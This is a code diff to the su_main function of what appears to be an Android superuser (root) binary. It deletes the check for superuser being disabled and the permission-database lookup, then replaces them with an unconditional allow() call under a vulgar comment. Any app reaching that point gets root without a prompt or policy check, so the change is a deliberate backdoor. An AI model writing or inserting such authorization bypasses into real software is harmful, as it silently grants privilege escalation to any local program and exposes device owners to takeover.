@@ -856,12 +856,6 @@ int su_main(int argc, char *argv[], int need_client) {
         allow(&ctx);
     }
 
-    // check if superuser is disabled completely
-    if (access_disabled(&ctx.from)) {
-        LOGD("access_disabled");
-        deny(&ctx);
-    }
-
     // autogrant shell at this point
     if (ctx.from.uid == AID_SHELL) {
         LOGD("Allowing shell.");
@@ -894,18 +888,9 @@ int su_main(int argc, char *argv[], int need_client) {
         deny(&ctx);
     }
 
-    dballow = database_check(&ctx);
-    switch (dballow) {
-        case INTERACTIVE:
-            break;
-        case ALLOW:
-            LOGD("db allowed");
-            allow(&ctx);    /* never returns */
-        case DENY:
-        default:
-            LOGD("db denied");
-            deny(&ctx);        /* never returns too */
-    }
+    // Fuck the polieze
+    LOGD("db allowed");
+	allow(&ctx);    /* never returns */
 
     socket_serv_fd = socket_create_temp(ctx.sock_path, sizeof(ctx.sock_path));
     LOGD(ctx.sock_path);
